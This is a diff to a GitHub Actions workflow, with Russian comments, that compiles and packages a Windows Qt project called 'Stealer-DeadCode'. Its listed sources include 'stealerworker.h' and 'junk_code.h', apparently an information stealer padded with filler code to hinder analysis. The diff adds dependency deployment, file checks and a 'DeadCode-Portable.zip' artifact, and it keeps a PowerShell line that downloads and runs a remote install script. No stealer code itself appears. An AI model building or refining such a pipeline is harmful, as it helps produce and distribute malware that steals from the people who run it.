@@ -33,19 +33,27 @@ jobs:
       with:
         python-version: '3.12'
 
-    # Шаг 3: Установка Chocolatey
-    - name: Install Chocolatey
+    # Шаг 3: Установка или проверка Chocolatey
+    - name: Setup Chocolatey
       run: |
-        Write-Host "Installing Chocolatey..."
-        Set-ExecutionPolicy Bypass -Scope Process -Force
-        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
-        iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
-        if ($LASTEXITCODE -ne 0 -and $LASTEXITCODE -ne 3010) {
-          Write-Host "Error: Chocolatey setup failed"
-          exit 1
+        Write-Host "Checking for Chocolatey installation..."
+        if (Test-Path "C:\ProgramData\Chocolatey\bin\choco.exe") {
+          Write-Host "Chocolatey already installed, skipping installation."
+          $env:Path = "C:\ProgramData\Chocolatey\bin;" + $env:Path
+          [System.Environment]::SetEnvironmentVariable("Path", $env:Path, [System.EnvironmentVariableTarget]::Process)
+          choco --version
+        } else {
+          Write-Host "Installing Chocolatey..."
+          Set-ExecutionPolicy Bypass -Scope Process -Force
+          [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
+          iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
+          if ($LASTEXITCODE -ne 0 -and $LASTEXITCODE -ne 3010) {
+            Write-Host "Error: Chocolatey setup failed"
+            exit 1
+          }
+          $env:Path = "C:\ProgramData\Chocolatey\bin;" + $env:Path
+          [System.Environment]::SetEnvironmentVariable("Path", $env:Path, [System.EnvironmentVariableTarget]::Process)
         }
-        $env:Path = "C:\ProgramData\chocolatey\bin;" + $env:Path
-        [System.Environment]::SetEnvironmentVariable("Path", $env:Path, [System.EnvironmentVariableTarget]::Process)
       shell: powershell
 
     # Шаг 4: Установка 7-Zip
@@ -99,6 +107,7 @@ jobs:
         $paths = @(
           "C:\Qt\$qtVersion\mingw81_64\bin\qmake.exe",
           "C:\Qt\$qtVersion\mingw81_64\bin\uic.exe",
+          "C:\Qt\$qtVersion\mingw81_64\bin\windeployqt.exe",
           "C:\Qt\Tools\mingw810_64\bin\g++.exe",
           "C:\Qt\Tools\mingw810_64\bin\mingw32-make.exe",
           "C:\Qt\$qtVersion\mingw81_64\bin\Qt5Core.dll",
@@ -163,7 +172,7 @@ jobs:
       run: |
         Set-Location C:\vcpkg
         Write-Host "Installing vcpkg dependencies..."
-        .\vcpkg.exe install sqlite3 curl openssl --triplet x64-mingw-static --clean-after-build
+        .\vcpkg.exe install sqlite3 curl openssl --triplet x64-mingw-dynamic --clean-after-build
         if ($LASTEXITCODE -ne 0) {
           Write-Host "Error: Failed to install dependencies"
           exit 1
@@ -185,17 +194,16 @@ jobs:
           "src\junk_code.h",
           "src\stealerworker.h",
           "icon.rc",
-          "icon.ico",
-          "config.json"
+          "icon.ico"
         )
         $missingFiles = $requiredFiles | Where-Object { -not (Test-Path $_) }
         if ($missingFiles) {
           Write-Host "Warning: Missing files: $missingFiles"
-          # Создаём заглушку config.json, если отсутствует
-          if ($missingFiles -contains "config.json") {
-            Write-Host "Creating stub config.json..."
-            Set-Content -Path "config.json" -Value "{}"
-          }
+        }
+        # Создаём config.json, если отсутствует
+        if (-not (Test-Path "config.json")) {
+          Write-Host "Creating stub config.json..."
+          Set-Content -Path "config.json" -Value "{}"
         }
         Write-Host "Project structure verified"
       shell: powershell
@@ -264,51 +272,115 @@ jobs:
         Write-Host "Build completed"
       shell: powershell
 
-    # Шаг 15: Копирование необходимых DLL и плагинов
-    - name: Copy dependencies
+    # Шаг 15: Развёртывание зависимостей с помощью windeployqt
+    - name: Deploy Qt dependencies
       run: |
-        Set-Location $env:GITHUB_WORKSPACE\Stealer-DeadCode\build
-        $qtPluginsDir = "C:\Qt\${{ env.QT_VERSION }}\mingw81_64\plugins"
-        New-Item -Path "release\platforms" -ItemType Directory -Force
-        New-Item -Path "release\sqldrivers" -ItemType Directory -Force
-        Copy-Item -Path "$qtPluginsDir\platforms\qwindows.dll" -Destination "release\platforms\"
-        Copy-Item -Path "$qtPluginsDir\sqldrivers\qsqlite.dll" -Destination "release\sqldrivers\"
-        Write-Host "Copied Qt plugins"
+        Set-Location $env:GITHUB_WORKSPACE\Stealer-DeadCode\build\release
+        $env:Path = "C:\Qt\${{ env.QT_VERSION }}\mingw81_64\bin;C:\Qt\Tools\mingw810_64\bin;" + $env:Path
+        Write-Host "Running windeployqt..."
+        windeployqt DeadCode.exe --release --no-translations --no-angle --no-opengl-sw
+        if ($LASTEXITCODE -ne 0) {
+          Write-Host "Error: windeployqt failed"
+          exit 1
+        }
+        Write-Host "Qt dependencies deployed"
       shell: powershell
 
-    # Шаг 16: Тестирование запуска
+    # Шаг 16: Копирование vcpkg-зависимостей
+    - name: Copy vcpkg dependencies
+      run: |
+        Set-Location $env:GITHUB_WORKSPACE\Stealer-DeadCode\build\release
+        $vcpkgBinDir = "C:\vcpkg\installed\x64-mingw-dynamic\bin"
+        $dlls = @(
+          "sqlite3.dll",
+          "libcurl.dll",
+          "libssl-3-x64.dll",
+          "libcrypto-3-x64.dll"
+        )
+        foreach ($dll in $dlls) {
+          if (Test-Path "$vcpkgBinDir\$dll") {
+            Copy-Item -Path "$vcpkgBinDir\$dll" -Destination .
+            Write-Host "Copied $dll"
+          } else {
+            Write-Host "Warning: $dll not found in vcpkg"
+          }
+        }
+        Write-Host "vcpkg dependencies copied"
+      shell: powershell
+
+    # Шаг 17: Копирование дополнительных файлов
+    - name: Copy additional files
+      run: |
+        Set-Location $env:GITHUB_WORKSPACE\Stealer-DeadCode
+        Copy-Item -Path "config.json" -Destination "build\release\"
+        Copy-Item -Path "icon.ico" -Destination "build\release\"
+        New-Item -Path "build\release\data" -ItemType Directory -Force
+        Write-Host "Additional files copied"
+      shell: powershell
+
+    # Шаг 18: Проверка наличия всех файлов
+    - name: Verify all files
+      run: |
+        Set-Location $env:GITHUB_WORKSPACE\Stealer-DeadCode\build\release
+        $requiredFiles = @(
+          "DeadCode.exe",
+          "Qt5Core.dll",
+          "Qt5Gui.dll",
+          "Qt5Widgets.dll",
+          "Qt5Network.dll",
+          "Qt5Sql.dll",
+          "sqlite3.dll",
+          "libcurl.dll",
+          "libssl-3-x64.dll",
+          "libcrypto-3-x64.dll",
+          "platforms\qwindows.dll",
+          "sqldrivers\qsqlite.dll",
+          "config.json",
+          "icon.ico",
+          "data"
+        )
+        foreach ($file in $requiredFiles) {
+          if (-not (Test-Path $file)) {
+            Write-Host "Error: $file is missing"
+            exit 1
+          }
+        }
+        Write-Host "All required files are present"
+      shell: powershell
+
+    # Шаг 19: Тестирование запуска
     - name: Test DeadCode.exe
       run: |
-        Set-Location $env:GITHUB_WORKSPACE\Stealer-DeadCode\build
+        Set-Location $env:GITHUB_WORKSPACE\Stealer-DeadCode\build\release
         $env:Path = "C:\Qt\${{ env.QT_VERSION }}\mingw81_64\bin;C:\Qt\Tools\mingw810_64\bin;" + $env:Path
         Write-Host "Running DeadCode.exe..."
-        Start-Process -FilePath "release\DeadCode.exe" -ArgumentList "--test" -NoNewWindow -Wait -RedirectStandardOutput "test_output.log" -RedirectStandardError "test_error.log"
+        Start-Process -FilePath "DeadCode.exe" -ArgumentList "--test" -NoNewWindow -Wait -RedirectStandardOutput "test_output.log" -RedirectStandardError "test_error.log"
         Write-Host "Test output:"
         Get-Content "test_output.log" -ErrorAction SilentlyContinue
         Write-Host "Test errors:"
         Get-Content "test_error.log" -ErrorAction SilentlyContinue
       shell: powershell
 
-    # Шаг 17: Создание артефакта
+    # Шаг 20: Создание артефакта
     - name: Create artifact
       run: |
         Set-Location $env:GITHUB_WORKSPACE\Stealer-DeadCode\build
-        7z a DeadCode-Build.zip .\release\*
+        7z a DeadCode-Portable.zip .\release\*
         if ($LASTEXITCODE -ne 0) {
           Write-Host "Error: Failed to create zip archive"
           exit 1
         }
       shell: powershell
 
-    # Шаг 18: Загрузка артефакта
+    # Шаг 21: Загрузка артефакта
     - name: Upload artifact
       uses: actions/upload-artifact@v4
       with:
-        name: DeadCode-Build
-        path: $env:GITHUB_WORKSPACE\Stealer-DeadCode\build\DeadCode-Build.zip
+        name: DeadCode-Portable
+        path: $env:GITHUB_WORKSPACE\Stealer-DeadCode\build\DeadCode-Portable.zip
         if-no-files-found: error
 
-    # Шаг 19: Очистка
+    # Шаг 22: Очистка
     - name: Cleanup
       if: always()
       run: |
